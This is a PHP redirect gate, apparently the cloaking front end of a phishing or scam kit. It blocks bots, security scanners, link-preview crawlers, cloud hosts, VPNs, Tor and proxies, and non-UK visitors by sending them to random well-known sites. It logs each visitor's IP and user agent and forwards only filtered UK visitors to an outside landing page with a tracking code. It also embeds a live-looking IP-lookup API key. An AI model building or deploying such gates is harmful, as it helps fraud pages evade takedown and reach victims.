<?php
ob_start();
date_default_timezone_set('Europe/London');

$redirect_link = "https://milentsankov.com/start/";
$log_file = __DIR__ . "/logs21.txt";
$allowed_countries = ['United Kingdom'];
$blocked_keywords = [
    'amazon', 'aws', 'google', 'gcp', 'microsoft', 'azure', 'ovh', 'digitalocean', 'do-', 'hetzner', 'linode',
    'contabo', 'oracle', 'cloud', 'cloudflare', 'cdn', 'akamai', 'fastly', 'vercel', 'render', 'fly.io', 'upcloud',
    'scaleway', 'vultr', 'packet', 'nocix', 'leaseweb', 'datacamp', 'sharktech', 'colo', 'kdatacenter', 'ipxo',
    'rfc1918', 'ipv6', 'host', 'hosting', 'server', 'servers', 'data center', 'data-center', 'seedbox',
    'liquidweb', 'softlayer', 'online.net', 'kimsufi', 'netprotect', 'anonymizer', 'privado', 'purevpn',
    'surfshark', 'nordvpn', 'expressvpn', 'hide.me', 'openvpn', 'pia', 'airvpn', 'protonvpn', 'cyberghost',
    'tor', 'exit node', 'vpn', 'proxy', 'tunnel', 'scraper', 'crawler', 'scanner', 'residential', 'ipqualityscore',
    'brightdata', 'oxylabs', 'smartproxy', 'luminati', 'residential proxy', 'datacenter proxy', 'crawlera',
    'zenrows', 'scrapinghub', 'scrapingbee', 'serpapi', 'apify', 'zyte'
];

$bot_patterns = [
    'curl', 'wget', 'python', 'python-requests', 'libwww', 'httpclient', 'aiohttp', 'urllib', 'mechanize',
    'node-fetch', 'axios', 'go-http-client', 'okhttp', 'cfnetwork', 'java', 'jakarta', 'fetch', 'http-request',
    'postmanruntime', 'insomnia', 'powershell', 'httpx', 'ruby', 'perl', 'php', 'bot', 'crawler', 'spider', 'scraper',
    'headless', 'phantomjs', 'screaming frog', 'puppeteer', 'playwright', 'slimerjs', 'selenium', 'ghost', 'htmlunit',
    'googlebot', 'bingbot', 'yahoo! slurp', 'yandexbot', 'duckduckbot', 'baiduspider', 'sogou', 'exabot',
    'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 'embedly', 'quora link preview', 'pinterest',
    'slackbot', 'vkshare', 'rogerbot', 'ahrefs', 'mj12bot', 'semrush', 'dotbot', 'petalbot', 'bytespider', 'serpstatbot',
    'seekport', 'seznambot', 'meta', 'curl', 'scrapy', 'crawlera', 'zyte', 'zenrows', 'apify', 'scrapinghub', 'serpapi'
];


function redirect_to_random_site_and_exit() {
    $random_sites = [
        'https://www.google.com',
        'https://www.gmail.com',
        'https://www.yahoo.com',
        'https://www.hotmail.com',
        'https://www.outlook.com',
        'https://www.bing.com',
        'https://www.duckduckgo.com',
        'https://www.youtube.com',
        'https://www.facebook.com',
        'https://www.twitter.com',
        'https://www.instagram.com',
        'https://www.linkedin.com',
        'https://www.tiktok.com',
        'https://www.reddit.com',
        'https://www.amazon.com',
        'https://www.ebay.com',
        'https://www.netflix.com',
        'https://www.spotify.com',
        'https://www.apple.com',
        'https://www.microsoft.com'
    ];
    $random_url = $random_sites[array_rand($random_sites)];
    header("Location: $random_url");
    exit;
}

function get_client_ip() {
    $keys = ['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $iplist = explode(',', $_SERVER[$key]);
            return trim($iplist[0]);
        }
    }
    return 'UNKNOWN';
}

if (empty($_COOKIE['js_verified'])) {
    echo "<html><head><script>
        document.cookie = 'js_verified=1; path=/';
        window.location.reload();
    </script></head><body>
    <noscript><meta http-equiv='refresh' content='0;url=https://www.google.com/'></noscript>
    </body></html>";
    exit;
}

$ip = get_client_ip();
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');

foreach ($bot_patterns as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        file_put_contents($log_file, "[BOT BLOCKED] $ip | UA: $user_agent | " . date("Y-m-d H:i:s") . PHP_EOL, FILE_APPEND);
        redirect_to_random_site_and_exit();
    }
}

$country = 'Unknown';
$isp = 'Unknown';
$api_key = 'cpx6YIVUHsWSZTq';
$api_url = "https://pro.ip-api.com/json/{$ip}?fields=country,isp,status&key={$api_key}";

$response = @file_get_contents($api_url);
if ($response !== false) {
    $data = json_decode($response, true);
    if (!empty($data) && $data['status'] === 'success') {
        $country = $data['country'] ?? 'Unknown';
        $isp = strtolower($data['isp'] ?? 'Unknown');
    }
}

$date = date("Y-m-d H:i:s");

foreach ($blocked_keywords as $keyword) {
    if (strpos($isp, $keyword) !== false || strpos($user_agent, $keyword) !== false) {
        file_put_contents($log_file, "[BLOCKED ISP] $ip | ISP: $isp | Country: $country | $date | UA: $user_agent\n", FILE_APPEND);
        redirect_to_random_site_and_exit();
    }
}

if (!in_array($country, $allowed_countries, true)) {
    file_put_contents($log_file, "[BLOCKED COUNTRY] $ip | Country: $country | ISP: $isp | $date | UA: $user_agent\n", FILE_APPEND);
    redirect_to_random_site_and_exit();
}

file_put_contents($log_file, "[ALLOWED] $ip | Country: $country | ISP: $isp | $date | UA: $user_agent\n", FILE_APPEND);

$unique_code = bin2hex(random_bytes(200)); // 400 characters

if (!headers_sent()) {
    if (!empty($_GET['userid'])) {
        $user_id = urlencode($_GET['userid']);
        header("Location: {$redirect_link}?code={$user_id}&code={$unique_code}");
    } else {
        header("Location: {$redirect_link}?ref={$unique_code}");
    }
}
exit;
?>
